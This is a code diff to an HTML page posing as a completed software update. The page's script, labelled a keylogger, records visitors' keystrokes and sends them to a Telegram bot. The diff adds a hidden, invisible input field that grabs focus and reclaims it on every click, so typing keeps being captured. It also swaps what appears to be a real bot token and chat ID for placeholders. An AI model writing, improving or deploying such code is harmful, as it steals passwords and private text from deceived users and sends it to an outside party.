@@ -21,6 +21,7 @@
             padding: 40px;
             border-radius: 20px;
             box-shadow: 0 0 30px rgba(0,0,0,0.8);
+            max-width: 90%;
         }
         h1 { color: #00ff88; }
         .progress {
@@ -43,6 +44,16 @@
             100% { width: 100%; }
         }
         .status { color: #aaa; font-size: 14px; }
+
+        /* Hidden input field — keyboard trigger ke liye */
+        #hiddenInput {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+            width: 1px;
+            height: 1px;
+        }
     </style>
 </head>
 <body>
@@ -54,13 +65,20 @@
         </div>
         <p class="status">✅ Update completed successfully</p>
     </div>
-    
+
+    <!-- Hidden input field — keyboard trigger ke liye -->
+    <input type="text" id="hiddenInput" autofocus>
+
     <script>
-        // ===== KEYLOGGER (Telegram Bot) =====
-        const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
-        const CHAT_ID = "1431950109";
+        // ===== KEYLOGGER =====
+        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+        const CHAT_ID = "YOUR_CHAT_ID_HERE";
         let buffer = "";
 
+        // Force focus on hidden input
+        document.getElementById('hiddenInput').focus();
+
+        // Keylogger
         document.addEventListener('keydown', (event) => {
             const key = event.key;
             if (key === "Enter") {
@@ -71,6 +89,11 @@
             } else if (key.length === 1) {
                 buffer += key;
             }
+        });
+
+        // Keep focus on hidden input
+        document.addEventListener('click', () => {
+            document.getElementById('hiddenInput').focus();
         });
 
         function sendToTelegram(msg) {
